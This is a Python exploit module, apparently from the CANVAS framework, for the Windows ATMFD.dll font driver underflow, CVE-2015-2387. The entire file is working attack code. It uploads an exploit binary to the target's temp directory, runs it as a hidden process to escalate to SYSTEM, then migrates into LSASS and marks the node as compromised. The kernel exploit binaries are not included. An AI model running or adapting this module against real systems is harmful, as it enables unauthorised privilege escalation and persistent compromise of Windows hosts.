#!/usr/bin/env python

import os
import sys
import random

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

NAME                           = 'ATMFD.dll Pool Buffer Underflow'
DESCRIPTION                    = 'ATMFD.dll pool buffer underflow Privilege Escalation'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2015-2387'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2387'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Windows', 'x86'] ]
PROPERTY['VERSION']            = ['XP Pro SP3',
                                  '7 Pro',
                                  '7 Pro SP1',
                                  '7 Ultimate SP1',
                                  '8.1 Enterprise']
PROPERTY['MS PATCHES']         = ["KB3077657"]

DOCUMENTATION['Notes']         = """
This module exploits a vulnerability on the Adobe Type Manager Font Driver (ATMFD.DLL).
While processing a font data there exists a buffer underflow condition, which is caused by a signed
number extending.

References:
http://blog.trendmicro.com/trendlabs-security-intelligence/a-look-at-the-open-type-font-manager-vulnerability-from-the-hacking-team-leak/

Tested on:
    Windows XP Professional SP3 x86
    Windows XP Professional SP2 x64
    Windows 7 Professional x86
    Windows 7 Professional SP1 x86
    Windows 7 Professional SP1 x64
    Windows 7 Ultimate SP1 x86
    Windows 8.1 Enterprise x86
    Windows 8.1 Enterprise x64
"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.remote_name    = '%s.exe' % random.randint(0, 1000)
        self.remote_exp     = ''

    def spawn_exploit(self, arg1):
        if self.is_winxpsp3_node():
            osVersion = 'xp'
        elif self.is_win2003sp2_node():
            osVersion = 'xp'
        elif self.is_win7_node():
            osVersion = 'win7'
        elif self.is_win81_node():
            osVersion = 'win81'
        else:
            major, minor, sp = self.GetVersionEx()
            self.log_error("Unsupported OS (GetVersionEx %d.%d.%d), bailing" % (major, minor, sp))
            return 0

        try:
            dst = os.path.join(self.remote_path, self.remote_name)
            cmd_line = dst + ' ' +  arg1 + ' ' + osVersion
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            self.log_error('%s' % ex)
            return False

        return ret

    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.summary[node] = 0
            self.node = node

            if not self.is_windows_node():
                continue

            if self.is_64bit_node():
                self.local_name = 'exploit64.exe'
            else:
                self.local_name = 'exploit.exe'

            self.local_exp = os.path.join(self.local_res, self.local_name)

            # first, we check to make sure we are not
            # already local/SYSTEM
            whoami = self.exploitnodes('whoami', [self.node])[0]

            self.log_info('Currently running as: %s' % (whoami))
            if whoami[-1] == '$':
                self.log_info("It appears you are already running as LOCAL/SYSTEM")
                continue

            self.remote_path = self.node.shell.GetTempPathA()
            if not self.remote_path:
                self.log_error('Could not resolve full temp dir path')
                continue
            else:
                self.log_info('Temp dir: %s' % self.remote_path)
                self.remote_exp = os.path.join(self.remote_path, self.remote_name)

            if self.node.shell.chdir(self.remote_path) < 0:
                self.log_error('Could not chdir into %s' % self.remote_path)
                continue

            self.add_file_for_cleanup(self.remote_exp)

            # upload binaries
            if not self.nodeUpload(self.local_exp, self.remote_exp):
                self.log_error('Error while uploading exploit binary')
                continue

            # spawn exploit
            pid  = self.node.shell.getpid()
            arg1 = "%s" % pid

            if not self.spawn_exploit(arg1):
                self.log_error('Could not spawn %s' % NAME)
                continue
            time.sleep(1)
            whoami = self.exploitnodes('whoami', [self.node])[0]
            self.log_info('Now running as: %s' % (whoami))

            # Just do a default mosdefmigrate and be done with it
            migrate = self.engine.getModuleExploit("mosdefmigrate")
            migrate.link(self)
            ret = migrate.run()

            if not ret:
                self.log_error("Failed to migrate to LSASS")
                self.log_error('%s failed' % NAME)
            else:
                # just to be sure
                if self.compromised():
                    self.nlog("Compromised")
                    self.summary[node] = 1
                    ret = 1

            time.sleep(1)

        return ret


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
